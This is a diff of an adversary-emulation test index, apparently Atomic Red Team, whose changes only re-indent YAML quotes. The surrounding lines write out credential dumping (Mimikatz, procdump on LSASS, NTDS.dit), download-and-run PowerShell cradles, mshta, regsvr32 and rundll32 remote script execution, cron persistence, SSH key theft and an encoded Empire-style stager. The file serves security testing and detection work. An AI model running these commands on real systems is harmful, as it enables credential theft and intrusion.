@@ -17674,7 +17674,7 @@ discovery:
         elevation_required: false
         command: 'net share
 
-'
+          '
   T1040:
     technique:
       x_mitre_data_sources:
@@ -17865,19 +17865,19 @@ discovery:
     - name: Examine password complexity policy - Ubuntu
       description: 'Lists the password complexity policy to console on Ubuntu Linux.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
         name: bash
         command: 'cat /etc/pam.d/common-password
 
-'
+          '
     - name: Examine password complexity policy - CentOS/RHEL 7.x
       description: 'Lists the password complexity policy to console on CentOS/RHEL
         7.x Linux.
 
-'
+        '
       supported_platforms:
       - linux
       dependencies:
@@ -17889,12 +17889,12 @@ discovery:
         name: bash
         command: 'cat /etc/security/pwquality.conf
 
-'
+          '
     - name: Examine password complexity policy - CentOS/RHEL 6.x
       description: 'Lists the password complexity policy to console on CentOS/RHEL
         6.x Linux.
 
-'
+        '
       supported_platforms:
       - linux
       dependencies:
@@ -17910,18 +17910,18 @@ discovery:
     - name: Examine password expiration policy - All Linux
       description: 'Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
         name: bash
         command: 'cat /etc/login.defs
 
-'
+          '
     - name: Examine local password policy - Windows
       description: 'Lists the local password policy to console on Windows.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -17929,11 +17929,11 @@ discovery:
         elevation_required: false
         command: 'net accounts
 
-'
+          '
     - name: Examine domain password policy - Windows
       description: 'Lists the domain password policy to console on Windows.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -17941,11 +17941,11 @@ discovery:
         elevation_required: false
         command: 'net accounts /domain
 
-'
+          '
     - name: Examine password policy - macOS
       description: 'Lists the password policy to console on macOS.
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -18027,7 +18027,7 @@ discovery:
     - name: Permission Groups Discovery
       description: 'Permission Groups Discovery
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -18040,7 +18040,7 @@ discovery:
     - name: Basic Permission Groups Discovery Windows
       description: 'Basic Permission Groups Discovery for Windows
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18053,7 +18053,7 @@ discovery:
     - name: Permission Groups Discovery PowerShell
       description: 'Permission Groups Discovery utilizing PowerShell
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -18071,7 +18071,7 @@ discovery:
       description: 'Runs "net group" command including command aliases and loose typing
         to simulate enumeration/discovery of high value domain groups
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18160,7 +18160,7 @@ discovery:
         elevation_required: false
         command: 'tasklist
 
-'
+          '
   T1012:
     technique:
       x_mitre_data_sources:
@@ -18346,7 +18346,7 @@ discovery:
         elevation_required: false
         command: 'net group "Domain Computers" /domain
 
-'
+          '
     - name: Remote System Discovery - nltest
       description: |
         Identify domain controllers for specified domain.
@@ -18364,7 +18364,7 @@ discovery:
         elevation_required: false
         command: 'nltest.exe /dclist:#{target_domain}
 
-'
+          '
     - name: Remote System Discovery - ping sweep
       description: |
         Identify remote systems via ping sweep.
@@ -18377,7 +18377,7 @@ discovery:
         elevation_required: false
         command: 'for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
 
-'
+          '
     - name: Remote System Discovery - arp
       description: "Identify remote systems via arp. \n\nUpon successful execution,
         cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n"
@@ -18388,7 +18388,7 @@ discovery:
         elevation_required: false
         command: 'arp -a
 
-'
+          '
     - name: Remote System Discovery - arp nix
       description: |
         Identify remote systems via arp.
@@ -18402,7 +18402,7 @@ discovery:
         elevation_required: false
         command: 'arp -a | grep -v ''^?''
 
-'
+          '
     - name: Remote System Discovery - sweep
       description: "Identify remote systems via ping sweep.\n\nUpon successful execution,
         sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if
@@ -18416,7 +18416,7 @@ discovery:
         command: 'for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ]
           && echo "192.168.1.$ip UP" || : ; done
 
-'
+          '
     - name: Remote System Discovery - nslookup
       description: "Powershell script that runs nslookup on cmd.exe against the local
         /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful
@@ -18484,7 +18484,7 @@ discovery:
     - name: Security Software Discovery
       description: 'Methods to identify Security Software on an endpoint
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18500,7 +18500,7 @@ discovery:
     - name: Security Software Discovery - powershell
       description: 'Methods to identify Security Software on an endpoint
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18514,7 +18514,7 @@ discovery:
     - name: Security Software Discovery - ps
       description: 'Methods to identify Security Software on an endpoint
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -18528,7 +18528,7 @@ discovery:
       description: 'Discovery of an installed Sysinternals Sysmon service using driver
         altitude (even if the name is changed).
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18536,11 +18536,11 @@ discovery:
         elevation_required: true
         command: 'fltmc.exe | findstr.exe 385201
 
-'
+          '
     - name: Security Software Discovery - AV Discovery via WMI
       description: 'Discovery of installed antivirus products via a WMI query.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18593,7 +18593,7 @@ discovery:
         software that is installed on the system. Adversaries may use the information
         from Software Discovery during automated discovery to shape follow-on behaviors
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18602,13 +18602,13 @@ discovery:
         command: 'reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"
           /v svcVersion
 
-'
+          '
     - name: Applications Installed
       description: 'Adversaries may attempt to get a listing of all software that
         is installed on the system. Adversaries may use the information from Software
         Discovery during automated discovery to shape follow-on behaviors
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18700,7 +18700,7 @@ discovery:
     - name: System Information Discovery
       description: 'Identify System Info
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18712,7 +18712,7 @@ discovery:
     - name: System Information Discovery
       description: 'Identify System Info
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -18725,7 +18725,7 @@ discovery:
     - name: List OS Information
       description: 'Identify System Info
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -18741,7 +18741,7 @@ discovery:
       description: 'Identify virtual machine hardware. This technique is used by the
         Pupy RAT and other malware.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -18759,7 +18759,7 @@ discovery:
       description: 'Identify virtual machine guest kernel modules. This technique
         is used by the Pupy RAT and other malware.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -18773,7 +18773,7 @@ discovery:
     - name: Hostname Discovery (Windows)
       description: 'Identify system hostname for Windows.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18781,11 +18781,11 @@ discovery:
         elevation_required: false
         command: 'hostname
 
-'
+          '
     - name: Hostname Discovery
       description: 'Identify system hostname for Linux and macOS systems.
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -18794,11 +18794,11 @@ discovery:
         elevation_required: false
         command: 'hostname
 
-'
+          '
     - name: Windows MachineGUID Discovery
       description: 'Identify the Windows MachineGUID value for a system.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -18807,7 +18807,7 @@ discovery:
         command: 'REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v
           MachineGuid
 
-'
+          '
   T1016:
     technique:
       x_mitre_data_sources:
@@ -18876,7 +18876,7 @@ discovery:
         elevation_required: false
         command: 'netsh advfirewall firewall show rule name=all
 
-'
+          '
     - name: System Network Configuration Discovery
       description: |
         Identify network configuration information.
@@ -18953,7 +18953,7 @@ discovery:
           | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n"
         cleanup_command: 'Remove-Item -ErrorAction ignore "#{output_file}"
 
-'
+          '
   T1049:
     technique:
       x_mitre_permissions_required:
@@ -19047,7 +19047,7 @@ discovery:
         elevation_required: false
         command: 'Get-NetTCPConnection
 
-'
+          '
     - name: System Network Connections Discovery Linux & MacOS
       description: |
         Get a listing of network connections.
@@ -19226,10 +19226,10 @@ discovery:
         elevation_required: false
         command: 'net.exe start >> #{output_file}
 
-'
+          '
         cleanup_command: 'del /f /q /s #{output_file} >nul 2>&1
 
-'
+          '
   T1124:
     technique:
       x_mitre_data_sources:
@@ -19284,7 +19284,7 @@ discovery:
     - name: System Time Discovery
       description: 'Identify the system time
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -19301,7 +19301,7 @@ discovery:
     - name: System Time Discovery - PowerShell
       description: 'Identify the system time via PowerShell
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -19309,7 +19309,7 @@ discovery:
         elevation_required: false
         command: 'Get-Date
 
-'
+          '
 credential-access:
   T1098:
     technique:
@@ -19407,7 +19407,7 @@ credential-access:
     - name: Admin Account Manipulate
       description: 'Manipulate Admin Account Name
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -19479,7 +19479,7 @@ credential-access:
       description: 'Search through bash history for specifice commands we want to
         capture
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -19502,7 +19502,7 @@ credential-access:
         command: 'cat #{bash_history_filename} | grep #{bash_history_grep_args} >
           #{output_file}
 
-'
+          '
   T1110:
     technique:
       x_mitre_permissions_required:
@@ -19605,7 +19605,7 @@ credential-access:
       description: 'Creates username and password files then attempts to brute force
         on remote host
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -19982,7 +19982,7 @@ credential-access:
         command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
           Invoke-Mimikatz -DumpCreds
 
-'
+          '
     - name: Gsecdump
       description: "Dump credentials from memory using Gsecdump.\n\nUpon successful
         execution, you should see domain\\username's following by two 32 characters
@@ -20120,7 +20120,7 @@ credential-access:
         command: "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n"
         cleanup_command: 'del "#{output_file}" >nul 2> nul
 
-'
+          '
     - name: Dump LSASS.exe Memory using Windows Task Manager
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
@@ -20174,7 +20174,7 @@ credential-access:
         command: '#{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
           full" exit
 
-'
+          '
     - name: Dump Active Directory Database with NTDSUtil
       description: |
         This test is intended to be run on a domain Controller.
@@ -20202,7 +20202,7 @@ credential-access:
         elevation_required: true
         command: 'ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
 
-'
+          '
     - name: Create Volume Shadow Copy with NTDS.dit
       description: |
         This test is intended to be run on a domain Controller.
@@ -20226,7 +20226,7 @@ credential-access:
         elevation_required: true
         command: 'vssadmin.exe create shadow /for=#{drive_letter}
 
-'
+          '
     - name: Copy NTDS.dit from Volume Shadow Copy
       description: "This test is intended to be run on a domain Controller.\n\nThe
         Active Directory database NTDS.dit may be dumped by copying it from a Volume
@@ -20274,7 +20274,7 @@ credential-access:
         files on the Domain Controller. This value can be decrypted with gpp-decrypt
         on Kali Linux.
 
-'
+        '
       supported_platforms:
       - windows
       dependency_executor_name: powershell
@@ -20289,7 +20289,7 @@ credential-access:
         elevation_required: false
         command: 'findstr /S cpassword %logonserver%\sysvol\*.xml
 
-'
+          '
     - name: GPP Passwords (Get-GPPPassword)
       description: |
         Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
@@ -20350,11 +20350,11 @@ credential-access:
         elevation_required: true
         command: 'pypykatz live lsa
 
-'
+          '
     - name: Registry parse with pypykatz
       description: 'Parses registry hives to obtain stored credentials
 
-'
+        '
       supported_platforms:
       - windows
       dependency_executor_name: powershell
@@ -20373,7 +20373,7 @@ credential-access:
         elevation_required: true
         command: 'pypykatz live registry
 
-'
+          '
   T1081:
     technique:
       x_mitre_permissions_required:
@@ -20449,11 +20449,11 @@ credential-access:
         name: sh
         command: 'python2 laZagne.py all
 
-'
+          '
     - name: Extract passwords with grep
       description: 'Extracting credentials from files
 
-'
+        '
       input_arguments:
         file_path:
           description: Path to search
@@ -20466,11 +20466,11 @@ credential-access:
         name: sh
         command: 'grep -ri password #{file_path}
 
-'
+          '
     - name: Extracting passwords with findstr
       description: 'Extracting Credentials from Files
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -20483,7 +20483,7 @@ credential-access:
       description: 'Attempts to access unattend.xml, where credentials are commonly
         stored, within the Panther directory where installation logs are stored.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -20546,7 +20546,7 @@ credential-access:
     - name: Enumeration for Credentials in Registry
       description: 'Queries to enumerate for credentials in the Registry.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -20558,7 +20558,7 @@ credential-access:
     - name: Enumeration for PuTTY Credentials in Registry
       description: 'Queries to enumerate for PuTTY credentials in the Registry.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -20566,7 +20566,7 @@ credential-access:
         elevation_required: false
         command: 'reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
 
-'
+          '
   T1179:
     technique:
       x_mitre_data_sources:
@@ -20696,7 +20696,7 @@ credential-access:
     - name: Hook PowerShell TLS Encrypt/Decrypt Messages
       description: 'Hooks functions in PowerShell to read TLS Communications
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -20804,7 +20804,7 @@ credential-access:
           .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
         cleanup_command: 'Remove-Item $env:TEMP\key.log -ErrorAction Ignore
 
-'
+          '
   T1141:
     technique:
       x_mitre_data_sources:
@@ -20878,7 +20878,7 @@ credential-access:
           to apply changes." & return & return  default answer "" with icon 1 with
           hidden answer with title "Software Update"''
 
-'
+          '
     - name: PowerShell - Prompt User for Password
       description: |
         Prompt User for Password (Local Phishing) as seen in Stitch RAT.
@@ -21227,7 +21227,7 @@ credential-access:
       description: 'Uses PowerShell to install and register a password filter DLL.
         Requires a reboot and administrative privileges.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -21321,11 +21321,11 @@ credential-access:
           dir c:\ /b /s .key | findstr /e .key
         cleanup_command: 'del c:\Windows\cert.key >nul 2>&1
 
-'
+          '
     - name: Discover Private SSH Keys
       description: 'Discover private SSH keys on a macOS or Linux system.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -21343,7 +21343,7 @@ credential-access:
       description: 'Copy private SSH keys on a Linux system to a staging folder using
         the `cp` command.
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -21361,7 +21361,7 @@ credential-access:
       description: 'Copy private SSH keys on a Linux or macOS system to a staging
         folder using the `rsync` command.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -21445,7 +21445,7 @@ execution:
         command: 'osascript "do shell script "echo \"import sys,base64,warnings;warnings.filterwarnings(''ignore'');exec(base64.b64decode(''aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK''));\"
           | python &""
 
-'
+          '
   T1191:
     technique:
       x_mitre_data_sources:
@@ -21525,7 +21525,7 @@ execution:
       description: 'Adversaries may supply CMSTP.exe with INF files infected with
         malicious commands
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -21545,12 +21545,12 @@ execution:
         elevation_required: false
         command: 'cmstp.exe /s #{inf_file_path}
 
-'
+          '
     - name: CMSTP Executing UAC Bypass
       description: 'Adversaries may invoke cmd.exe (or other malicious commands) by
         embedding them in the RunPreSetupCommandsSection of an INF file
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -21570,7 +21570,7 @@ execution:
         elevation_required: false
         command: 'cmstp.exe /s #{inf_file_uac} /au
 
-'
+          '
   T1059:
     technique:
       x_mitre_data_sources:
@@ -21715,7 +21715,7 @@ execution:
         elevation_required: false
         command: 'hh.exe #{local_chm_file}
 
-'
+          '
     - name: Compiled HTML Help Remote Payload
       description: |
         Uses hh.exe to execute a remote compiled HTML Help payload.
@@ -21732,7 +21732,7 @@ execution:
         elevation_required: false
         command: 'hh.exe #{remote_chm_file}
 
-'
+          '
   '':
     technique:
       x_mitre_permissions_required:
@@ -21890,7 +21890,7 @@ execution:
         elevation_required: false
         command: 'control.exe #{cpl_file_path}
 
-'
+          '
   T1173:
     technique:
       x_mitre_data_sources:
@@ -21970,7 +21970,7 @@ execution:
     - name: Execute Commands
       description: 'Executes commands via DDE using Microsfot Word
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -21992,7 +21992,7 @@ execution:
         ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download
         and execute a powershell script
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -22000,7 +22000,7 @@ execution:
         elevation_required: false
         command: 'start $PathToAtomicsFolder\T1173\bin\DDE_Document.docx
 
-'
+          '
   T1118:
     technique:
       x_mitre_data_sources:
@@ -22058,7 +22058,7 @@ execution:
       description: 'Executes the CheckIfInstallable class constructor runner instead
         of executing InstallUtil.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -22124,7 +22124,7 @@ execution:
       description: 'Executes the InstallHelper class constructor runner instead of
         executing InstallUtil.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -22191,7 +22191,7 @@ execution:
     - name: InstallUtil class constructor method call
       description: 'Executes the installer assembly class constructor.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -22258,7 +22258,7 @@ execution:
     - name: InstallUtil Install method call
       description: 'Executes the Install Method
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -22325,7 +22325,7 @@ execution:
     - name: InstallUtil Uninstall method call - /U variant
       description: 'Executes the Uninstall Method
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -22393,7 +22393,7 @@ execution:
         variant
       description: 'Executes the Uninstall Method
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -22460,7 +22460,7 @@ execution:
     - name: InstallUtil HelpText method call
       description: 'Executes the Uninstall Method
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -22528,7 +22528,7 @@ execution:
       description: 'Executes an InstallUtil assembly by renaming InstallUtil.exe and
         using a nonstandard extension for the assembly.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -22645,14 +22645,14 @@ execution:
     - name: Launchctl
       description: 'Utilize launchctl
 
-'
+        '
       supported_platforms:
       - macos
       executor:
         name: sh
         command: 'launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator
 
-'
+          '
   T1168:
     technique:
       x_mitre_data_sources:
@@ -22740,7 +22740,7 @@ execution:
         of the referenced file. This technique was used by numerous IoT automated
         exploitation attacks.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -22757,13 +22757,13 @@ execution:
         name: bash
         command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
 
-'
+          '
     - name: Cron - Add script to cron folder
       description: 'This test adds a script to a cron folder configured to execute
         on a schedule. This technique was used by the threat actor Rocke during the
         exploitation of Linux web servers.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -22780,7 +22780,7 @@ execution:
         name: bash
         command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
 
-'
+          '
     - name: Event Monitor Daemon Persistence
       description: "This test adds persistence via a plist to execute via the macOS
         Event Monitor Daemon. \n"
@@ -22931,7 +22931,7 @@ execution:
         elevation_required: false
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
 
-'
+          '
     - name: Mshta calls a local VBScript file to launch notepad.exe
       description: Tests execution of a local program by a VBScript file called by
         Mshta
@@ -22946,7 +22946,7 @@ execution:
         name: command_prompt
         command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""#{local_file_path}"")(window.close)")
 
-'
+          '
     - name: Mshta executes VBScript to execute malicious command
       description: |
         Run a local VB script to run local user enumeration powershell command
@@ -22959,7 +22959,7 @@ execution:
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
           -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
-'
+          '
     - name: Mshta Executes Remote HTML Application (HTA)
       description: |
         Execute an arbitrary remote HTA.
@@ -22983,7 +22983,7 @@ execution:
           mshta "#{temp_file}"
         cleanup_command: 'remove-item "#{temp_file}" -ErrorAction Ignore
 
-'
+          '
   T1086:
     technique:
       x_mitre_permissions_required:
@@ -23077,7 +23077,7 @@ execution:
     - name: Mimikatz
       description: 'Download Mimikatz and dump credentials
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23091,7 +23091,7 @@ execution:
         command: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''#{mimurl}'');
           Invoke-Mimikatz -DumpCreds"
 
-'
+          '
     - name: BloodHound
       description: "Upon execution BloodHound will be downloaded and executed. It
         will set up collection methods, run,\n\nand then compress and store the data
@@ -23109,7 +23109,7 @@ execution:
         command: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''#{bloodurl}'');
           Invoke-BloodHound"
 
-'
+          '
     - name: Obfuscation Tests
       description: |
         Different obfuscated methods to test
@@ -23126,7 +23126,7 @@ execution:
     - name: Mimikatz - Cradlecraft PsSendKeys
       description: 'Run mimikatz via PsSendKeys
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -23158,11 +23158,11 @@ execution:
         command: 'Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'');
           Invoke-AppPathBypass -Payload ''C:\Windows\System32\cmd.exe''"
 
-'
+          '
     - name: PowerShell Add User
       description: 'Using PS 5.1, add a user via CLI
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23188,7 +23188,7 @@ execution:
         command: 'New-LocalUser -FullName ''#{full_name}'' -Name ''#{user_name}''
           -Password #{password} -Description ''#{description}''
 
-'
+          '
     - name: Powershell MsXml COM object - no prompt
       description: |
         Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -23208,7 +23208,7 @@ execution:
           -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open(''GET'',''#{url}'',$False);$comMsXml.Send();IEX
           $comMsXml.ResponseText"
 
-'
+          '
     - name: Powershell MsXml COM object - with prompt
       description: |
         Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -23228,7 +23228,7 @@ execution:
           MsXml2.ServerXmlHttp;$comMsXml.Open(''GET'',''#{url}'',$False);$comMsXml.Send();IEX
           $comMsXml.ResponseText"
 
-'
+          '
     - name: Powershell XML requests
       description: |
         Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -23247,7 +23247,7 @@ execution:
           bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''#{url}'');$Xml.command.a.execute
           | IEX"
 
-'
+          '
     - name: Powershell invoke mshta.exe download
       description: |
         Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -23264,7 +23264,7 @@ execution:
         elevation_required: false
         command: '"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject(''script:#{url}'').Exec();close()"
 
-'
+          '
     - name: Powershell Invoke-DownloadCradle
       description: |
         Provided by https://github.com/mgreen27/mgreen27.github.io
@@ -23280,7 +23280,7 @@ execution:
       description: 'Execution of a PowerShell payload from the Windows Registry similar
         to that seen in fileless malware infections.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -23296,7 +23296,7 @@ execution:
     - name: PowerShell Downgrade Attack
       description: 'Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
 
-'
+        '
       supported_platforms:
       - windows
       dependencies:
@@ -23310,12 +23310,12 @@ execution:
         elevation_required: false
         command: 'powershell.exe -version 2 -Command Write-Host $PSVersion
 
-'
+          '
     - name: NTFS Alternate Data Stream Access
       description: 'Creates a file with an alternate data stream and simulates executing
         that hidden code/file
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23337,7 +23337,7 @@ execution:
           Invoke-Expression $streamcommand
         cleanup_command: 'Remove-Item #{ads_file} -Force -ErrorAction Ignore
 
-'
+          '
   T1121:
     technique:
       x_mitre_data_sources:
@@ -23401,7 +23401,7 @@ execution:
     - name: Regasm Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23429,12 +23429,12 @@ execution:
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
         cleanup_command: 'del #{output_file} >nul 2>&1
 
-'
+          '
     - name: Regsvs Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
         SNK
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23542,7 +23542,7 @@ execution:
       description: 'Regsvr32.exe is a command-line program used to register and unregister
         OLE controls
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23562,12 +23562,12 @@ execution:
         elevation_required: false
         command: 'regsvr32.exe /s /u /i:#{filename} scrobj.dll
 
-'
+          '
     - name: Regsvr32 remote COM scriptlet execution
       description: 'Regsvr32.exe is a command-line program used to register and unregister
         OLE controls
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23580,12 +23580,12 @@ execution:
         elevation_required: false
         command: 'regsvr32.exe /s /u /i:#{url} scrobj.dll
 
-'
+          '
     - name: Regsvr32 local DLL execution
       description: 'Regsvr32.exe is a command-line program used to register and unregister
         OLE controls
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23607,7 +23607,7 @@ execution:
         command: 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
           /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
 
-'
+          '
   T1085:
     technique:
       x_mitre_data_sources:
@@ -23670,7 +23670,7 @@ execution:
     - name: Rundll32 execute JavaScript Remote Payload With GetObject
       description: 'Test execution of a remote script using rundll32.exe
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -23683,7 +23683,7 @@ execution:
         elevation_required: false
         command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
 
-'
+          '
     - name: Rundll32 execute VBscript command
       description: |
         Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
@@ -23701,7 +23701,7 @@ execution:
         elevation_required: false
         command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
 
-'
+          '
     - name: Rundll32 advpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with advpack.dll.
@@ -23726,7 +23726,7 @@ execution:
         elevation_required: false
         command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
 
-'
+          '
     - name: Rundll32 ieadvpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with ieadvpack.dll.
@@ -23751,7 +23751,7 @@ execution:
         elevation_required: false
         command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
 
-'
+          '
     - name: Rundll32 syssetup.dll Execution
       description: |
